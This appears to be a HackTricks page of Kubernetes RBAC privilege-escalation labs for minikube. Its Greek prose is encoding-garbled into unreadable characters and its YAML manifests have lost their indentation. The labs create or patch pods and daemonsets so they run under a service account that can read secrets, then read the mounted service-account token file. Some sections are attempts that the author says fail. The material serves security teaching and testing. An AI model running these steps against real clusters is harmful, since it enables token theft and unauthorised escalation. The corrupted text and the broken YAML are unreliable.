# Î•ÏÎ³Î±ÏƒÏ„Î®ÏÎ¹Î¿ ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ·Ï‚ Î¡ÏŒÎ»Ï‰Î½ ÏƒÏ„Î¿ Kubernetes

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ Hacking Ï„Î¿Ï… AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Î•ÎºÏ€Î±Î¯Î´ÎµÏ…ÏƒÎ· HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ Hacking Ï„Î¿Ï… GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Î•ÎºÏ€Î±Î¯Î´ÎµÏ…ÏƒÎ· HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ÏƒÏ„Î·Î½ ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± Ï‡Î¬ÎºÎµÏ ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ Ï…Ï€Î¿Î²Î¿Î»Î® PRs** ÏƒÏ„Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ Ï„Î¿Ï… [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Ï„Î¬ Ï„Î± ÎµÏÎ³Î±ÏƒÏ„Î®ÏÎ¹Î± Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ **minikube**.

## Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Pod -> Î‘Î½Î¬Î´ÎµÎ¹Î¾Î· ÏƒÎµ ns SAs

Î˜Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î¼Îµ:

* ÎˆÎ½Î± **Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ "test-sa"** Î¼Îµ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÏŒÏ„Î·Ï„Î± ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Î³Î¹Î± **Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· Î¼Ï…ÏƒÏ„Î¹ÎºÏÎ½**
* ÎˆÎ½Î± ClusterRole "test-cr" ÎºÎ±Î¹ Î­Î½Î± ClusterRoleBinding "test-crb" Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸Î¿ÏÎ½
* **Î”Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±** Î³Î¹Î± Ï„Î· Î»Î¯ÏƒÏ„Î± ÎºÎ±Î¹ **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±** pods ÏƒÎµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± "**Test**" Î¸Î± Î´Î¿Î¸Î¿ÏÎ½
* ÎˆÎ½Î±Ï‚ Î¡ÏŒÎ»Î¿Ï‚ "test-r" ÎºÎ±Î¹ Î¼Î¹Î± Î£ÏÎ½Î´ÎµÏƒÎ· Î¡ÏŒÎ»Î¿Ï… "test-rb" Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸Î¿ÏÎ½
* Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î¸Î± **ÎµÏ€Î¹Î²ÎµÎ²Î±Î¹ÏÏƒÎ¿Ï…Î¼Îµ** ÏŒÏ„Î¹ Î¿ SA Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î»Î¯ÏƒÏ„Î±ÏÎµÎ¹ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ ÎºÎ±Î¹ ÏŒÏ„Î¹ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Test Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î»Î¯ÏƒÏ„Î±ÏÎµÎ¹ pods
* Î¤Î­Î»Î¿Ï‚ Î¸Î± **Ï…Ï€Î¿ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Test** Î³Î¹Î± Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± pod** Ï€Î¿Ï… Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î¿Î½ **SA test-sa** ÎºÎ±Î¹ Î½Î± **ÎºÎ»Î­ÏˆÎ¿Ï…Î¼Îµ** Ï„Î¿ token Ï„Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚.
* Î‘Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Î´ÎµÎ¯Î¾ÎµÏ„Îµ ÏŒÏ„Î¹ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±Î´ÎµÎ¯Î¾ÎµÎ¹ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î¼Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿

{% hint style="info" %}
Î“Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï„Î¿Ï… ÏƒÎµÎ½Î±ÏÎ¯Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î­Î½Î±Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®.\
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î³Î¹Î± Ï„Î¿ **ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÏŒÏ„Î·Ï„Î± Ï„Î¿Ï… token sa** ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¿ **Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®** Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½Î¿ pod. Î©ÏƒÏ„ÏŒÏƒÎ¿, **ÏŒÏ€Ï‰Ï‚ ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ ÎµÎ´Ï**, Î· **Î´Î®Î»Ï‰ÏƒÎ· Ï„Î¿Ï… pod Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î·Î½ ÎµÎ¾Ï‰Ï„ÎµÏÎ¯ÎºÎµÏ…ÏƒÎ· Ï„Î¿Ï… token**, Î­Ï„ÏƒÎ¹ Î· Î¬Î´ÎµÎ¹Î± "exec" Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î· Î³Î¹Î± Ï„Î·Î½ ÎµÎ¾Ï‰Ï„ÎµÏÎ¯ÎºÎµÏ…ÏƒÎ· Ï„Î¿Ï… token, Î· Î¬Î´ÎµÎ¹Î± **"create" ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î®**.
{% endhint %}
```bash
# Create Service Account test-sa
# Create role and rolebinding to give list and create permissions over pods in default namespace to user Test
# Create clusterrole and clusterrolebinding to give the SA test-sa access to secrets everywhere

echo 'apiVersion: v1
kind: ServiceAccount
metadata:
name: test-sa
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
name: test-r
rules:
- apiGroups: [""]
resources: ["pods"]
verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
name: test-rb
subjects:
- kind: ServiceAccount
name: test-sa
- kind: User
name: Test
roleRef:
kind: Role
name: test-r
apiGroup: rbac.authorization.k8s.io
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
name: test-cr
rules:
- apiGroups: [""]
resources: ["secrets"]
verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
name: test-crb
subjects:
- kind: ServiceAccount
namespace: default
name: test-sa
apiGroup: ""
roleRef:
kind: ClusterRole
name: test-cr
apiGroup: rbac.authorization.k8s.io' | kubectl apply -f -

# Check test-sa can access kube-system secrets
kubectl --as system:serviceaccount:default:test-sa -n kube-system get secrets

# Check user User can get pods in namespace default
kubectl --as Test -n default get pods

# Create a pod as user Test with the SA test-sa (privesc step)
echo "apiVersion: v1
kind: Pod
metadata:
name: test-pod
namespace: default
spec:
containers:
- name: alpine
image: alpine
command: ['/bin/sh']
args: ['-c', 'sleep 100000']
serviceAccountName: test-sa
automountServiceAccountToken: true
hostNetwork: true"| kubectl --as Test apply -f -

# Connect to the pod created an confirm the attached SA token belongs to test-sa
kubectl exec -ti -n default test-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d "." -f2 | base64 -d

# Clean the scenario
kubectl delete pod test-pod
kubectl delete clusterrolebinding test-crb
kubectl delete clusterrole test-cr
kubectl delete rolebinding test-rb
kubectl delete role test-r
kubectl delete serviceaccount test-sa
```
## Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Daemonset
```bash
# Create Service Account test-sa
# Create role and rolebinding to give list & create permissions over daemonsets in default namespace to user Test
# Create clusterrole and clusterrolebinding to give the SA test-sa access to secrets everywhere

echo 'apiVersion: v1
kind: ServiceAccount
metadata:
name: test-sa
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
name: test-r
rules:
- apiGroups: ["apps"]
resources: ["daemonsets"]
verbs: ["get", "list", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
name: test-rb
subjects:
- kind: User
name: Test
roleRef:
kind: Role
name: test-r
apiGroup: rbac.authorization.k8s.io
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
name: test-cr
rules:
- apiGroups: [""]
resources: ["secrets"]
verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
name: test-crb
subjects:
- kind: ServiceAccount
namespace: default
name: test-sa
apiGroup: ""
roleRef:
kind: ClusterRole
name: test-cr
apiGroup: rbac.authorization.k8s.io' | kubectl apply -f -

# Check test-sa can access kube-system secrets
kubectl --as system:serviceaccount:default:test-sa -n kube-system get secrets

# Check user User can get pods in namespace default
kubectl --as Test -n default get daemonsets

# Create a daemonset as user Test with the SA test-sa (privesc step)
echo "apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: default
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: test-sa
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ['/bin/sh']
args: ['-c', 'sleep 100000']"| kubectl --as Test apply -f -

# Connect to the pod created an confirm the attached SA token belongs to test-sa
kubectl exec -ti -n default daemonset.apps/alpine -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d "." -f2 | base64 -d

# Clean the scenario
kubectl delete daemonset alpine
kubectl delete clusterrolebinding test-crb
kubectl delete clusterrole test-cr
kubectl delete rolebinding test-rb
kubectl delete role test-r
kubectl delete serviceaccount test-sa
```
### Î•Ï€Î¹Î´Î¹Î¿ÏÎ¸ÏÏƒÏ„Îµ Ï„Î¿ Daemonset

Î£Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Î¸Î± **ÎµÏ€Î¹Î´Î¹Î¿ÏÎ¸ÏÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± daemonset** Î³Î¹Î± Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ Ï„Î¿ pod Ï„Î¿Ï… Î½Î± Ï†Î¿ÏÏ„ÏÎ½ÎµÎ¹ Ï„Î¿ ÎµÏ€Î¹Î¸Ï…Î¼Î·Ï„ÏŒ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Î¼Î±Ï‚.

Î‘Î½ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î­Ï‡ÎµÎ¹ Ï„Î· **Î»Î­Î¾Î· ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ· Î±Î½Ï„Î¯ Î³Î¹Î± ÎµÏ€Î¹Î´Î¹ÏŒÏÎ¸Ï‰ÏƒÎ·, Î±Ï…Ï„ÏŒ Î´ÎµÎ½ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹**.
```bash
# Create Service Account test-sa
# Create role and rolebinding to give list & update patch permissions over daemonsets in default namespace to user Test
# Create clusterrole and clusterrolebinding to give the SA test-sa access to secrets everywhere

echo 'apiVersion: v1
kind: ServiceAccount
metadata:
name: test-sa
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
name: test-r
rules:
- apiGroups: ["apps"]
resources: ["daemonsets"]
verbs: ["get", "list", "patch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
name: test-rb
subjects:
- kind: User
name: Test
roleRef:
kind: Role
name: test-r
apiGroup: rbac.authorization.k8s.io
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
name: test-cr
rules:
- apiGroups: [""]
resources: ["secrets"]
verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
name: test-crb
subjects:
- kind: ServiceAccount
namespace: default
name: test-sa
apiGroup: ""
roleRef:
kind: ClusterRole
name: test-cr
apiGroup: rbac.authorization.k8s.io
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: default
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
automountServiceAccountToken: false
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ['/bin/sh']
args: ['-c', 'sleep 100']' | kubectl apply -f -

# Check user User can get pods in namespace default
kubectl --as Test -n default get daemonsets

# Create a daemonset as user Test with the SA test-sa (privesc step)
echo "apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: default
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: test-sa
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ['/bin/sh']
args: ['-c', 'sleep 100000']"| kubectl --as Test apply -f -

# Connect to the pod created an confirm the attached SA token belongs to test-sa
kubectl exec -ti -n default daemonset.apps/alpine -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d "." -f2 | base64 -d

# Clean the scenario
kubectl delete daemonset alpine
kubectl delete clusterrolebinding test-crb
kubectl delete clusterrole test-cr
kubectl delete rolebinding test-rb
kubectl delete role test-r
kubectl delete serviceaccount test-sa
```
## Î”ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯

### Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±/Î•Ï€Î¹Î´Î¹ÏŒÏÎ¸Ï‰ÏƒÎ· Î”ÎµÏƒÎ¼ÎµÏÏƒÎµÏ‰Î½

**Î”ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯:**

* **Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î¼Î¹Î± Î½Î­Î± RoleBinding** Î¼ÏŒÎ½Î¿ Î¼Îµ Ï„Î¿ ÏÎ®Î¼Î± **create**
* **Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î¼Î¹Î± Î½Î­Î± RoleBinding** Î¼ÏŒÎ½Î¿ Î¼Îµ Ï„Î¿ ÏÎ®Î¼Î± **patch** (Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ Î¬Î´ÎµÎ¹ÎµÏ‚ Î´ÎµÏƒÎ¼ÎµÏÏƒÎµÏ‰Î½)
* Î”ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± Î±Î½Î±Î¸Î­ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÏÏŒÎ»Î¿ ÏƒÏ„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ ÏƒÎ±Ï‚ Î® ÏƒÎµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ SA
* **Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Î¼Î¹Î± Î½Î­Î± RoleBinding** Î¼ÏŒÎ½Î¿ Î¼Îµ Ï„Î¿ ÏÎ®Î¼Î± **patch** (Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ Î¬Î´ÎµÎ¹ÎµÏ‚ Î´ÎµÏƒÎ¼ÎµÏÏƒÎµÏ‰Î½)
* Î”ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± Î±Î½Î±Î¸Î­ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÏÏŒÎ»Î¿ ÏƒÏ„Î¿Î½ ÎµÎ±Ï…Ï„ÏŒ ÏƒÎ±Ï‚ Î® ÏƒÎµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ SA
```bash
echo 'apiVersion: v1
kind: ServiceAccount
metadata:
name: test-sa
---
apiVersion: v1
kind: ServiceAccount
metadata:
name: test-sa2
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
name: test-r
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
resources: ["rolebindings"]
verbs: ["get", "patch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
name: test-rb
subjects:
- kind: User
name: Test
roleRef:
kind: Role
name: test-r
apiGroup: rbac.authorization.k8s.io
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
name: test-r2
rules:
- apiGroups: [""]
resources: ["pods"]
verbs: ["get", "list", "delete", "patch", "create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
name: test-rb2
subjects:
- kind: ServiceAccount
name: test-sa
apiGroup: ""
roleRef:
kind: Role
name: test-r2
apiGroup: rbac.authorization.k8s.io' | kubectl apply -f -

# Create a pod as user Test with the SA test-sa (privesc step)
echo "apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
name: test-r2
subjects:
- kind: ServiceAccount
name: test-sa2
apiGroup: ""
roleRef:
kind: Role
name: test-r2
apiGroup: rbac.authorization.k8s.io"| kubectl --as Test apply -f -

# Connect to the pod created an confirm the attached SA token belongs to test-sa
kubectl exec -ti -n default test-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d "." -f2 | base64 -d

# Clean the scenario
kubectl delete rolebinding test-rb
kubectl delete rolebinding test-rb2
kubectl delete role test-r
kubectl delete role test-r2
kubectl delete serviceaccount test-sa
kubectl delete serviceaccount test-sa2
```
### Î£Ï…Î½Î´Î­ÏƒÎµÎ¹Ï‚ Î´ÎµÏƒÎ¼ÎµÏÏƒÎµÏ‰Î½ ÎµÎ¼Ï†Î±Î½ÏÏ‚

Î£Ï„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± "Î ÏÏŒÎ»Î·ÏˆÎ· Î‘Î½ÏŒÎ´Î¿Ï… Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ ÎºÎ±Î¹ Î•ÎºÎºÎ¯Î½Î·ÏƒÎ·" Ï„Î¿Ï… [https://unofficial-kubernetes.readthedocs.io/en/latest/admin/authorization/rbac/](https://unofficial-kubernetes.readthedocs.io/en/latest/admin/authorization/rbac/) Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÏŒÏ„Î¹ ÎµÎ¬Î½ Î­Î½Î± SA Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¼Î¹Î± Î”Î­ÏƒÎ¼ÎµÏ…ÏƒÎ· ÎºÎ±Î¹ Î­Ï‡ÎµÎ¹ ÎµÎ¼Ï†Î±Î½ÏÏ‚ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î´Î­ÏƒÎ¼ÎµÏ…ÏƒÎ·Ï‚ ÏƒÏ„Î¿Î½ Î¡ÏŒÎ»Î¿/Cluster role, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î´ÎµÏƒÎ¼ÎµÏÏƒÎµÎ¹Ï‚ Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¡ÏŒÎ»Î¿Ï…Ï‚/ClusterRoles Î¼Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï€Î¿Ï… Î´ÎµÎ½ Î­Ï‡ÎµÎ¹.\
Î©ÏƒÏ„ÏŒÏƒÎ¿, Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿ÏÏÎ³Î·ÏƒÎµ Î³Î¹Î± ÎµÎ¼Î­Î½Î±:
```yaml
# Create 2 SAs, give one of them permissions to create clusterrolebindings
# and bind permissions over the ClusterRole "admin"
echo 'apiVersion: v1
kind: ServiceAccount
metadata:
name: test-sa
---
apiVersion: v1
kind: ServiceAccount
metadata:
name: test-sa2
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
name: test-cr
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
resources: ["clusterrolebindings"]
verbs: ["get", "create"]
- apiGroups: ["rbac.authorization.k8s.io/v1"]
resources: ["clusterroles"]
verbs: ["bind"]
resourceNames: ["admin"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
name: test-crb
subjects:
- kind: ServiceAccount
name: test-sa
namespace: default
roleRef:
kind: ClusterRole
name: test-cr
apiGroup: rbac.authorization.k8s.io
' | kubectl apply -f -

# Try to bind the ClusterRole "admin" with the second SA (won't work)
echo 'apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
name: test-crb2
subjects:
- kind: ServiceAccount
name: test-sa2
namespace: default
roleRef:
kind: ClusterRole
name: admin
apiGroup: rbac.authorization.k8s.io
' | kubectl --as system:serviceaccount:default:test-sa apply -f -

# Clean environment
kubectl delete clusterrolebindings test-crb
kubectl delete clusterrolebindings test-crb2
kubectl delete clusterrole test-cr
kubectl delete serviceaccount test-sa
kubectl delete serviceaccount test-sa
```

```yaml
# Like the previous example, but in this case we try to use RoleBindings
# instead of CLusterRoleBindings

echo 'apiVersion: v1
kind: ServiceAccount
metadata:
name: test-sa
---
apiVersion: v1
kind: ServiceAccount
metadata:
name: test-sa2
---
kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
name: test-cr
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
resources: ["clusterrolebindings"]
verbs: ["get", "create"]
- apiGroups: ["rbac.authorization.k8s.io"]
resources: ["rolebindings"]
verbs: ["get", "create"]
- apiGroups: ["rbac.authorization.k8s.io/v1"]
resources: ["clusterroles"]
verbs: ["bind"]
resourceNames: ["admin","edit","view"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
name: test-rb
namespace: default
subjects:
- kind: ServiceAccount
name: test-sa
namespace: default
roleRef:
kind: ClusterRole
name: test-cr
apiGroup: rbac.authorization.k8s.io
' | kubectl apply -f -

# Won't work
echo 'apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
name: test-rb2
namespace: default
subjects:
- kind: ServiceAccount
name: test-sa2
namespace: default
roleRef:
kind: ClusterRole
name: admin
apiGroup: rbac.authorization.k8s.io
' | kubectl --as system:serviceaccount:default:test-sa apply -f -

# Clean environment
kubectl delete rolebindings test-rb
kubectl delete rolebindings test-rb2
kubectl delete clusterrole test-cr
kubectl delete serviceaccount test-sa
kubectl delete serviceaccount test-sa2
```
### Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÏÏŒÎ»Ï‰Î½ Î¼Îµ Ï„Ï…Ï‡Î±Î¯ÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚

Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î¿ÏÎ¼Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± ÏÏŒÎ»Î¿ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±Ï‚ ÎºÎ±Î¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿Ï…Ï‚ Ï€ÏŒÏÎ¿Ï…Ï‚ Ï„Ï‰Î½ ÏÏŒÎ»Ï‰Î½. Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï„Î¿ K8s Î¼Î±Ï‚ ÎµÎ¼Ï€Î¿Î´Î¯Î¶ÎµÎ¹ Î±Ï€ÏŒ Ï„Î¿ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± ÏÏŒÎ»Î¿ Î¼Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚ Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Î¿ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÏŒÏ‚:
```yaml
# Create a SA and give the permissions "create" and "patch" over "roles"
echo 'apiVersion: v1
kind: ServiceAccount
metadata:
name: test-sa
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
name: test-r
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
resources: ["roles"]
verbs: ["patch", "create", "get"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
name: test-rb
subjects:
- kind: ServiceAccount
name: test-sa
roleRef:
kind: Role
name: test-r
apiGroup: rbac.authorization.k8s.io
